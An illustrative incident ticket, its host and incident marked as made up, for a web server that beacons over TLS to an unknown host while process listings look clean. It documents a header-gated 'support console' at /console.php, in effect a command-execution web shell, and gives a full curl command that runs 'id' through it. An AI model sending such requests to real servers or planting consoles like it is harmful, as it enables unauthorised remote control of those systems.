# Illustrative: the host and the incident are made up.

Ironbridge Fitness web box, ticket 4417

- Firewall: the box opens a TLS connection to a stranger every few minutes.
- ps, top, ls /proc: nothing unusual.
- Support console is at /console.php. It wants the header
      X-Console: support-7f3a
  and a form field named q holding the command, e.g.
      curl -H 'X-Console: support-7f3a' -d 'q=id' http://<your-instance>/console.php
